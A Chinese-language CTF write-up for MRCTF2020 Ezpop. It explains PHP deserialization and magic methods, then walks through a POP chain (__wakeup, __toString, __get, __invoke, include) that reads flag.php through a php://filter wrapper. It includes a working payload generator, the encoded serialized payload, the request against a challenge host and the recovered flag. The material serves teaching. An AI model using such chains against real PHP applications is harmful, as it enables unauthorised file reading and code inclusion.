# Writeup 4 [MRCTF2020] Ezpop

该 Writeup 涵盖反序列化基础、源码分析、魔法方法详解以及 POP 链的完整推导过程。

**理解每个魔法方法的触发条件是解题的关键。**



## 目录

1. [什么是反序列化？](#1-什么是反序列化)
2. [源码分析](#2-源码分析)
3. [PHP 魔法方法详解](#3-php-魔法方法详解)
4. [POP 链构造与触发过程](#4-pop-链构造与触发过程)
5. [最终 Payload 与 Flag](#5-最终-payload-与-flag)

---

## 1. 什么是反序列化？

### 1.1 序列化与反序列化

- **序列化（serialize）**：将 PHP 中的对象、数组等数据结构转换成可存储或传输的字符串格式。
- **反序列化（unserialize）**：将该字符串还原回原来的 PHP 数据结构。

**示例**：

```php
<?php

$obj = new stdClass();
$obj->name = "Alice";
$serialized = serialize($obj);
echo $serialized;
$restored = unserialize($serialized);

?>
```

运行结果：

```php
O:8:"stdClass":1:{s:4:"name";s:5:"Alice";}

Process finished with exit code 0
```

### 1.2 反序列化漏洞

当反序列化的数据**由用户控制**（如从 GET、POST、Cookie 中获取），且程序中存在某些**魔法方法**（`__wakeup`、`__destruct`、`__toString` 等）时，攻击者可以精心构造序列化字符串，在反序列化过程中**自动触发这些方法**，形成一条调用链（POP 链），最终达到恶意目的（如：文件读取、命令执行等）。

---

## 2. 源码分析

题目源码（`index.php`）给出了三个类：`Modifier`、`Show`、`Test`。flag 位于 `flag.php` 中。

### 2.1 `Modifier` 类

```php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```

- **属性**：
  - `protected $var`：受保护的属性，存储要包含的文件路径。
- **方法**：
  - `append($value)`：直接 `include` 传入的参数。这是文件包含的最终执行点。
  - `__invoke()`：当对象被当作函数调用时触发，会调用 `append($this->var)`。

**目标**：让 `$var = "flag.php"` 并触发 `__invoke()`，即可包含 flag 文件。

### 2.2 `Show` 类

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

- **属性**：
  - `public $source`：通常是文件路径或另一个对象。
  - `public $str`：可以是任意对象。
- **方法**：
  - `__construct($file)`：在 `new Show()` 时设置 `$source`，并输出欢迎语。
  - `__toString()`：当对象被当作字符串使用时触发，返回 `$this->str->source`。如果 `$this->str` 是一个没有 `source` 属性的对象，会触发该对象的 `__get()` 方法。
  - `__wakeup()`：反序列化时自动触发。它会用正则检查 `$this->source` 是否包含危险协议（gopher/http/file/ftp/https/dict）或 `..`，若包含则重置为 `"index.php"`。

**关键点**：`__wakeup()` 中的 `preg_match` 会将 `$this->source` **隐式转换为字符串**。如果 `$this->source` 是一个对象，就会触发该对象的 `__toString()` 方法。

### 2.3 `Test` 类

```php
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

- **属性**：
  - `public $p`：存储一个可调用的对象或函数名。
- **方法**：
  - `__construct()`：初始化 `$p` 为空数组。
  - `__get($key)`：当访问一个不存在的属性时触发（如 `$obj->source`），会执行 `$this->p()`，即把 `$this->p` 当作函数调用。如果 `$this->p` 是一个 `Modifier` 对象，就会触发 `Modifier::__invoke()`。

### 2.4 主程序入口

```php
if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

- 如果 GET 参数 `pop` 存在，则反序列化它；否则显示当前文件源码。
- **注意**：反序列化后没有对结果进行任何操作（没有 `echo`、没有字符串拼接）。这意味着 POP 链必须依赖**反序列化过程中自动触发的魔法方法**（如 `__wakeup`、`__destruct`）来推进。

---

## 3. PHP 魔法方法详解

|    魔法方法     | 触发时机                                                     | 语法                                     | 参数           | 示例                             |
| :-------------: | ------------------------------------------------------------ | ---------------------------------------- | -------------- | -------------------------------- |
| `__construct()` | `new` 实例化对象时                                           | `function __construct([mixed $args...])` | 可选参数       | `$obj = new Show("index.php");`  |
| `__destruct()`  | 对象销毁时（脚本结束或 `unset`）                             | `function __destruct()`                  | 无             | 自动触发                         |
|  `__wakeup()`   | `unserialize()` 反序列化时                                   | `function __wakeup()`                    | 无             | `unserialize($data);` 后自动调用 |
| `__toString()`  | 对象被当作字符串使用时（如 `echo $obj`、`preg_match` 中的字符串转换） | `function __toString()`                  | 无，返回字符串 | `echo new Show();`               |
|  `__get($key)`  | 访问对象不存在的属性时                                       | `function __get($key)`                   | `$key`：属性名 | `echo $obj->nonExist;`           |
|  `__invoke()`   | 对象被当作函数调用时                                         | `function __invoke([$args...])`          | 任意参数       | `$obj();`                        |

### 本题中利用的触发条件

- `__wakeup()`：反序列化 `Show` 对象时自动触发。
- `__toString()`：`preg_match` 将对象转为字符串时触发。
- `__get()`：访问 `Test` 对象不存在的 `source` 属性时触发。
- `__invoke()`：`Test::__get()` 中将 `$this->p` 当作函数调用时触发。

---

## 4. POP 链构造与触发过程

### 4.1 目标

触发 `Modifier::__invoke()` → `Modifier::append("flag.php")` → 包含 `flag.php`。

### 4.2 逆向推导（从目标反推）

1. **触发 `Modifier::__invoke()`**：需要将 `Modifier` 对象当作函数调用。
   → 在 `Test::__get()` 中，`return $function();` 如果 `$function = new Modifier()`，就会触发。
2. **触发 `Test::__get('source')`**：需要访问 `Test` 对象不存在的 `source` 属性。
   → 在 `Show::__toString()` 中，`return $this->str->source;` 如果 `$this->str = new Test()`，且 `Test` 没有 `source` 属性，就会触发。
3. **触发 `Show::__toString()`**：需要将 `Show` 对象当作字符串使用。
   → 在 `Show::__wakeup()` 中，`preg_match("/.../", $this->source)` 如果 `$this->source` 是一个 `Show` 对象，就会触发该对象的 `__toString()`。
4. **触发 `Show::__wakeup()`**：反序列化一个 `Show` 对象时自动触发。

### 4.3 构造 POP 链

我们需要**两个 `Show` 对象**：

- **`Show1`**：反序列化时触发 `__wakeup()`，其 `$source` 为 `Show2` 对象。
- **`Show2`**：在 `preg_match` 中被转为字符串，触发 `__toString()`，其 `$str` 为 `Test` 对象。
- **`Test` 对象**：其 `$p` 为 `Modifier` 对象。
- **`Modifier` 对象**：其 `$var = "php://filter/convert.base64-encode/resource=flag.php"`（绕过直接输出限制）。

### 4.4 序列化数据结构

```php
$modifier = new Modifier();
$modifier->var = "php://filter/convert.base64-encode/resource=flag.php";

$test = new Test();
$test->p = $modifier;

$show2 = new Show();
$show2->source = "index.php";   // 普通字符串，通过正则检查
$show2->str = $test;

$show1 = new Show();
$show1->source = $show2;        // 对象，触发嵌套 __toString
$show1->str = null;             // 无关

echo serialize($show1);
```

### 4.5 触发流程详解

1. 用户发送 `?pop=序列化后的show1`。
2. `unserialize($show1)` 创建 `Show1` 对象，自动调用 `Show1::__wakeup()`。
3. `__wakeup()` 中执行 `preg_match("/.../", $show1->source)`，由于 `$show1->source = $show2`（对象），PHP 将 `$show2` 转为字符串 → 调用 `$show2->__toString()`。
4. `$show2->__toString()` 执行 `return $this->str->source;`，其中 `$this->str = $test`（`Test` 对象），且 `$test` 没有 `source` 属性 → 触发 `Test::__get('source')`。
5. `Test::__get($key)` 执行 `$function = $this->p; return $function();`，其中 `$this->p = $modifier`（`Modifier` 对象）→ 将 `$modifier` 当作函数调用 → 触发 `Modifier::__invoke()`。
6. `Modifier::__invoke()` 执行 `$this->append($this->var);`，即 `include("php://filter/convert.base64-encode/resource=flag.php")`。
7. `include` 读取 `flag.php` 并返回其 base64 编码内容（因为 PHP 无法执行 base64 流，直接输出源码）。
8. 页面显示 base64 字符串，解码后得到 flag。

---

## 5. 最终 Payload 与 Flag

### 5.1 生成 Payload 的 PHP 代码

```php
<?php
class Modifier {
    protected $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Test {
    public $p;
    public function __construct() {
        $this->p = new Modifier();
    }
}
class Show {
    public $source;
    public $str;
    public function __construct($source, $str) {
        $this->source = $source;
        $this->str = $str;
    }
}
$show2 = new Show("index.php", new Test());
$show1 = new Show($show2, null);
echo urlencode(serialize($show1));
?>
```

运行结果：

```php
O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
Process finished with exit code 0
```

### 5.2 发送请求

```http
http://c515220e-e33b-435a-944d-7756ff4e481c.node5.buuoj.cn:81?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

### 5.3 响应内容（base64）

```
PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezkwYTg1YmVmLWVlYjItNDdhZi1hODU3LTVjNDk3M2JhMzgxZn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+
```

### 5.4 解码后得到 flag

```php
<?php
class Flag{
    private $flag= "flag{90a85bef-eeb2-47af-a857-5c4973ba381f}";
}
echo "Help Me Find FLAG!";
?>
```

---

## 总结

本题利用 PHP 反序列化中的魔法方法链（`__wakeup` → `__toString` → `__get` → `__invoke` → `include`），通过精心构造的 POP 链实现了远程文件包含，最终读取了 `flag.php` 的源码。

